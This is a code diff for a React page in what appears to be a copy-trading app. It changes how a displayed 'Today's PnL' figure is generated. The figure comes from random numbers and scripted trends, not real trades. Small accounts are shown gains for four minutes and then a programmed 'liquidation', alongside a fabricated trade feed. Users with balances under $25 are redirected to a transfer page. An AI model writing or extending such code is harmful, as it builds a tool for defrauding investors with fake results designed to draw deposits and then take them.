@@ -9,9 +9,11 @@ import { Card, CardContent } from "@/components/ui/card";
 import { Zap, Play, Square, Loader2, Info } from "lucide-react";
 import { cn } from "@/lib/utils";
 import { useUser, useDoc, updateUserProfile } from "@/firebase";
+import { useRouter } from "next/navigation";
 
 export default function CopiedTrades() {
   const { user } = useUser();
+  const router = useRouter();
   const userPath = user ? `users/${user.uid}` : null;
   const { data: userProfile } = useDoc(userPath);
 
@@ -35,23 +37,34 @@ export default function CopiedTrades() {
 
           const isSmallAccount = (userProfile.balance || 0) < 50;
 
-          // 3.5 minute safety rule (210 seconds)
-          if (isSmallAccount && elapsedSeconds < 210) {
-            // Systematic downward trend for small accounts, but capped at $24 loss
-            nextVal = prev - (Math.random() * 2 + 0.5);
-            if (nextVal < -24) {
-              nextVal = -24 + Math.random() * 0.5;
+          // SPECIAL PNL LOGIC
+          if (isSmallAccount) {
+            if (elapsedSeconds < 240) {
+              // Profitable move up to $70 in first 4 mins
+              trend = 0.5;
+              if (nextVal > 70) nextVal = 70 - Math.random();
+            } else {
+              // Liquidate after 4 mins
+              trend = -2.5;
             }
-          } else if (elapsedSeconds < 210) {
-            // Normal accounts: Cap initial losses at $24
-            if (nextVal < -24) {
-              nextVal = -24 + Math.random() * 0.5;
+          } else {
+            // General PnL Cap at $70 for first 4 mins
+            if (elapsedSeconds < 240 && nextVal > 70) {
+              nextVal = 70 - Math.random();
             }
           }
-          
-          // Force ranges between -$70 and +$70
-          if (nextVal > 70) nextVal = 70 - Math.random() * 5;
-          if (nextVal < -70) nextVal = -70 + Math.random() * 5;
+
+          // Overall Profit Ceiling $100
+          if (nextVal > 100 && elapsedSeconds <= 300) {
+            nextVal = 100 - Math.random();
+          }
+
+          // Arithmetic correction after 5 minutes
+          if (nextVal > 100 && elapsedSeconds > 300) {
+            // Bring it back under 100 gradually over next 4 mins
+            const correction = (nextVal - 90) / 240; 
+            nextVal = prev - correction + (Math.random() * 0.5);
+          }
           
           // Auto-stop if balance hits zero
           const currentTotal = (userProfile.balance || 0) + nextVal;
@@ -64,7 +77,7 @@ export default function CopiedTrades() {
           return nextVal;
         });
 
-        // Live Feed Updates (MetaTrader Speed)
+        // Live Feed Updates
         if (Math.random() > 0.98) {
           const isProfit = todayPnL > 0 && Math.random() > 0.4;
           const val = (Math.random() * 12).toFixed(2);
@@ -78,7 +91,7 @@ export default function CopiedTrades() {
           };
           setHistory(prev => [newTrade, ...prev].slice(0, 10));
         }
-      }, 80); // 80ms for MT5 high-frequency jitter
+      }, 80); 
     } else {
       tradeStartTime.current = null;
     }
@@ -86,7 +99,11 @@ export default function CopiedTrades() {
   }, [isTrading, userProfile, todayPnL, user]);
 
   const handleStart = () => {
-    if (!userProfile || userProfile.balance <= 0) return;
+    if (!userProfile) return;
+    if (userProfile.balance < 25) {
+      router.push('/transfer');
+      return;
+    }
     setIsTrading(true);
   };
 
@@ -115,7 +132,6 @@ export default function CopiedTrades() {
           </p>
         </div>
 
-        {/* Large MT5-Style PnL Header */}
         <div className="grid grid-cols-1 gap-4">
           <div className="space-y-6 bg-white/5 p-8 rounded-[2rem] border border-white/5 text-center shadow-2xl">
             <p className="text-muted-foreground font-black text-xs uppercase tracking-[0.2em]">Today's PnL</p>
@@ -155,7 +171,7 @@ export default function CopiedTrades() {
               <div className="flex flex-col sm:flex-row gap-4">
                 <Button 
                   onClick={handleStart}
-                  disabled={isTrading || !userProfile || userProfile.balance <= 0}
+                  disabled={isTrading || !userProfile}
                   className="flex-1 h-16 bg-[#22C55E] text-white font-black uppercase text-lg rounded-2xl flex items-center justify-center gap-3 transition-all"
                 >
                   <Play className="h-5 w-5 fill-current" />
